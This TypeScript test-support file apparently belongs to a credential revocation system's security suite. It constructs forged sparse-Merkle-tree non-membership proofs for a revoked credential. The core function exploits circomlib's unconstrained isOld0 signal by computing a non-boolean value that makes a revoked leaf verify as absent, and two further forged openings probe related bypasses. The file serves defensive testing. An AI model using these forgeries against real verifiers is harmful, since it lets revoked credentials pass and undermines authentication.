import { newMemEmptyTrie } from "circomlibjs";
import { getPoseidon, poseidonBig, smtKeyFromCredId, BN254_P } from "@pqid/common/encoding";
import { SMT_DEPTH, REVOKED_LEAF_VALUE, type NonMembershipProof } from "@pqid/revocation";

/**
 * Hand-built revocation openings for a REVOKED credential (the attacker's side
 * of the SMT routes in security_suite.ts). The revoked set is public, so the
 * attacker can rebuild the tree and read the revoked leaf's own siblings.
 *
 * forgedIsOld0Opening is the attack the v3 review found: circomlib's
 * SMTVerifier never constrains isOld0 to {0,1}. With fnc = 1 the node at the
 * leaf's level becomes Hash1(oldKey, oldValue) * (1 - isOld0), so choosing
 *   isOld0 = 1 - Hash1(key, 1) / Hash1(oldKey, oldValue)
 * turns it into the revoked leaf itself, and the real siblings rebuild the
 * real root: a "non-membership" proof for a member.
 */
export interface RevokedInclusion {
  key: bigint;
  /** Siblings of the revoked leaf, leaf level first (unpadded). */
  siblings: bigint[];
  root: bigint;
}

export async function revokedInclusion(
  revokedCredIds: Uint8Array[],
  target: Uint8Array
): Promise<RevokedInclusion> {
  const poseidon = await getPoseidon();
  const tree = await newMemEmptyTrie();
  for (const id of revokedCredIds) await tree.insert(smtKeyFromCredId(poseidon, id), REVOKED_LEAF_VALUE);
  const key = smtKeyFromCredId(poseidon, target);
  const res = await tree.find(key);
  if (!res.found) throw new Error("target is not in the revoked set");
  return {
    key,
    siblings: res.siblings.map((s) => tree.F.toObject(s)),
    root: tree.F.toObject(tree.root),
  };
}

function modPow(base: bigint, exp: bigint, mod: bigint): bigint {
  let r = 1n;
  let b = base % mod;
  let e = exp;
  while (e > 0n) {
    if (e & 1n) r = (r * b) % mod;
    b = (b * b) % mod;
    e >>= 1n;
  }
  return r;
}

function pad(siblings: bigint[]): string[] {
  const out = siblings.map((s) => s.toString());
  while (out.length < SMT_DEPTH) out.push("0");
  return out;
}

/** Non-boolean isOld0 that makes the revoked leaf pass as an "empty" slot. */
export async function forgedIsOld0Opening(inc: RevokedInclusion): Promise<NonMembershipProof> {
  const poseidon = await getPoseidon();
  const oldKey = 1n;
  const oldValue = 0n;
  const hOld = poseidonBig(poseidon, [oldKey, oldValue, 1n]);
  const target = poseidonBig(poseidon, [inc.key, REVOKED_LEAF_VALUE, 1n]);
  const ratio = (target * modPow(hOld, BN254_P - 2n, BN254_P)) % BN254_P;
  const isOld0 = (1n - ratio + BN254_P) % BN254_P;
  return {
    siblings: pad(inc.siblings),
    oldKey: oldKey.toString(),
    oldValue: oldValue.toString(),
    isOld0: isOld0.toString() as "0" | "1", // deliberately outside {0,1}
    key: inc.key.toString(),
    root: inc.root.toString(),
  };
}

/** isOld0 = 0 claiming the leaf found on the path is a DIFFERENT key — but it is the key itself. */
export function sameKeyOpening(inc: RevokedInclusion): NonMembershipProof {
  return {
    siblings: pad(inc.siblings),
    oldKey: inc.key.toString(),
    oldValue: REVOKED_LEAF_VALUE.toString(),
    isOld0: "0",
    key: inc.key.toString(),
    root: inc.root.toString(),
  };
}

/** isOld0 = 1 claiming an empty slot one level above the revoked leaf. */
export function truncatedEmptyOpening(inc: RevokedInclusion): NonMembershipProof {
  return {
    siblings: pad(inc.siblings.slice(0, -1)),
    oldKey: "0",
    oldValue: "0",
    isOld0: "1",
    key: inc.key.toString(),
    root: inc.root.toString(),
  };
}
